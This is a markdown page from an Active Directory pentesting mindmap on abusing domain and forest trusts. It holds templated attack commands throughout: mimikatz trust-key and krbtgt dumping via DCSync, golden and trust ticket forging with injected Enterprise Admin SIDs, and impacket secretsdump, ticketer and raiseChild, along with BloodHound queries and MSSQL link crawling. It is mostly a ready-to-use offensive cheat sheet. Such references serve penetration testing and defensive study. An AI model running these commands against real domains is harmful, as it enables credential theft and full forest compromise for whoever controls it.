---
title: "Trusts"
category: trusts
color: "#6D8764"
tags:
  - ad-mindmap
  - trusts
---

# 🤝 Trusts

> [!info] Mindmap box `Trusts`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Enumeration

- `nltest.exe /trusted_domains` [↗](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11))
- `([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()`
- `Get-DomainTrust -Domain <domain>` [↗](https://github.com/PowerShellMafia/PowerSploit)
- `Get-DomainTrustMapping` [↗](https://github.com/PowerShellMafia/PowerSploit)
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts` [↗](https://github.com/franc-pentest/ldeep)
- `sharphound.exe -c trusts -d <domain>` [↗](https://github.com/SpecterOps/SharpHound)
    - `MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p` [↗](https://github.com/SpecterOps/BloodHound)
- Get Domains SID
    - `Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>` [↗](https://github.com/PowerShellMafia/PowerSploit)
    - `lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0` [↗](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)

## Child->Parent

- Trust Key ➡️ [[Lateral Movement|PassTheTicket]]
    - `mimikatz lsadump::trust /patch` [↗](https://github.com/gentilkiwi/mimikatz)
        - `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt` [↗](https://github.com/gentilkiwi/mimikatz)
    - `secretsdump.py -just-dc-user '<parent_domain>$'   <domain>/<user>:<password>@<dc_ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
        - `ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- Golden Ticket ➡️ [[Lateral Movement|PassTheTicket]]
    - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt` [↗](https://github.com/gentilkiwi/mimikatz)
        - `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt` [↗](https://github.com/gentilkiwi/mimikatz)
    - `raiseChild.py <child_domain>/<user>:<password>` [↗](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py)
    - `ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- Unconstrained delegation
    - coerce parent_dc on child_dc domain ➡️ [[Kerberos Delegation|unconstrained delegation]]

## Parent->Child

- same as Child to parent

## External Trust

- DomainA <--> DomainB trust (B trust A, A trust B)
    - from A to B FOREST_TRANSITIVE
        - password reuse ➡️ [[Lateral Movement|lat move (creds/pth/...)]]
        - Foreign group and users ➡️ [[ACLs & ACEs Permissions|ACL]]
            - Users with foreign Domain Group Membership
                - `MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p` [↗](https://github.com/SpecterOps/BloodHound)
            - Group with foreign Domain Group Membership
                - `MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p` [↗](https://github.com/SpecterOps/BloodHound)
        - SID History on B ➡️ [[Lateral Movement|PassTheTicket]]
            - Golden ticket
                - `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt` [↗](https://github.com/gentilkiwi/mimikatz)
                    - `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt` [↗](https://github.com/gentilkiwi/mimikatz)
                - `ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeuser` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
            - Trust ticket
                - `secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
                    - `ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser` [↗](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
        - ADCS abuse ➡️ [[ADCS|ADCS]]
    - from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL
        - Unconstrained delegation
            - coerce dc_b on dc_a ➡️ [[Kerberos Delegation|unconstrained delegation]]
- DomainA <-- DomainB trust (B trust A / A access B)
    - Same as double trust, but no unconstrained delegation as B can't connect to A
- DomainA --> DomainB trust (A trust B / B access A)
    - password reuse ➡️ [[Lateral Movement|lat move (creds/pth/...)]]

## Mssql links
➡️ [[Lateral Movement|MSSQL]]

- MSSQL trusted links doesn't care of trust link
    - `Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>` [↗](https://github.com/NetSPI/PowerUpSQL)
    - `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>` [↗](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
        - trustlink
            - sp_linkedservers
                - use_link
